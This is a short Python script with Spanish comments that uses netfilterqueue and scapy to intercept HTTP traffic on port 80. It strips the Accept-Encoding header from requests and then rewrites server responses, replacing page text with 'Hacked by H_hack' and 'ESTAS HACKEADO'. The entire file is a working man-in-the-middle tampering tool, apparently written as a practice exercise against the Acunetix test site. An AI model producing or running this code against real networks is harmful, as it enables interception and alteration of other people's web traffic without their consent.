import netfilterqueue
import scapy.all as scapy
import signal
from termcolor import colored
import re
import sys

def signal_handler(signal,frame):#esto es para que cuando se presione ctrl+c se detenga el programa
    print(colored("\n Saliendo... \n","red"))
    sys.exit(1)
    
signal.signal(signal.SIGINT,signal_handler)

def set_load(packet,load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len#esto es para que scapy calcule el nuevo tamaño del paquete
    del packet[scapy.IP].chksum#esto es para que scapy calcule el nuevo checksum
    del packet[scapy.TCP].chksum#esto es para que scapy calcule el nuevo checksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        try:
            if scapy_packet[scapy.TCP].dport == 80:#estamos en el paquete de peticion
                modifed_load = re.sub(b"Accept-Encoding:.*?\\r\\n",b"",scapy_packet[scapy.Raw].load)#esto es para que el servidor no comprima la respuesta
                new_packet = set_load(scapy_packet,modifed_load)
                packet.set_payload(new_packet.build())
            elif scapy_packet[scapy.TCP].sport == 80:#estamos en el paquete de respuesta
                modifed_load = scapy_packet[scapy.Raw].load.replace(b"Home of Acunetix Art",b"Hacked by H_hack")
                modifed_load = modifed_load.replace(b"welcome to our page",b" ESTAS HACKEADO")
                new_packet = set_load(scapy_packet,modifed_load)
                packet.set_payload(new_packet.build())

        except:
            pass
    
    
    
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
